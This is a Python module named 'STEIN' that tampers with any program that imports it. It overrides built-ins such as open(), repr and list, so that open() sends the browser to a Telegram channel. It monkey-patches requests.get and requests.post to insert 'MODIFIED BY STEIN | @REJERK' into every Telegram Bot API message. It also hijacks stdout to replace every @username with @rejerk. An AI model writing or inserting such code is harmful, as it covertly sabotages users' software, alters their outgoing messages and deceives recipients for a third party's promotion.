import sys
import re
import requests
import urllib.parse
import webbrowser

print('STEIN MODULE LOADED')

# ========================== 1. OVERRIDE repr & list ==========================
repr = lambda *args: f"{args}"
list = lambda *args: f"{args}"

# ========================== 2. OVERRIDE open() ==========================
def open(text):
    """Always redirects to t.me/rejerk."""
    webbrowser.open("https://t.me/rejerk")
    return "rejerk"

# ========================== 3. REPLACE TELEGRAM USERNAMES IN TEXT ==========================
def replace_usernames_in_text(text):
    """Replaces all @usernames with @rejerk."""
    return re.sub(r'@\w+', '@rejerk', text)

# ========================== 4. INTERCEPT & MODIFY TELEGRAM API REQUESTS ==========================
original_get = requests.get
original_post = requests.post

def modify_telegram_text(url, data=None):
    """Modifies Telegram API messages by adding 'Modified by STEIN'."""
    if "api.telegram.org" in url and "sendMessage" in url:
        if data and isinstance(data, dict) and "text" in data:
            data["text"] = "MODIFIED BY STEIN | @REJERK • " + data["text"]
        elif "&text=" in url:
            base, text = url.split("&text=", 1)
            decoded_text = urllib.parse.unquote(text)
            modified_text = "MODIFIED BY STEIN | @REJERK • " + decoded_text.strip()
            encoded_text = urllib.parse.quote(modified_text)
            url = base + "&text=" + encoded_text
    return url, data

def modified_get(url, *args, **kwargs):
    """Override requests.get to modify Telegram messages."""
    url, _ = modify_telegram_text(url)
    return original_get(url, *args, **kwargs)

def modified_post(url, *args, **kwargs):
    """Override requests.post to modify Telegram messages."""
    data = kwargs.get("data", None)
    url, data = modify_telegram_text(url, data)
    if data is not None:
        kwargs["data"] = data
    return original_post(url, *args, **kwargs)

requests.get = modified_get
requests.post = modified_post

# ========================== 5. STDOUT INTERCEPTION ==========================
stduot = type("Stdout", (), {
    "write": lambda self, text: sys.__stdout__.write(replace_usernames_in_text(text)),
    "flush": lambda self: sys.__stdout__.flush()
})()
sys.stdout = stduot

stdout = type("Stdout", (), {
    "write": lambda self, text: sys.stdout.write(text),
    "flush": lambda self: sys.stdout.flush()
})()

print("[STEIN] MODULE READY")
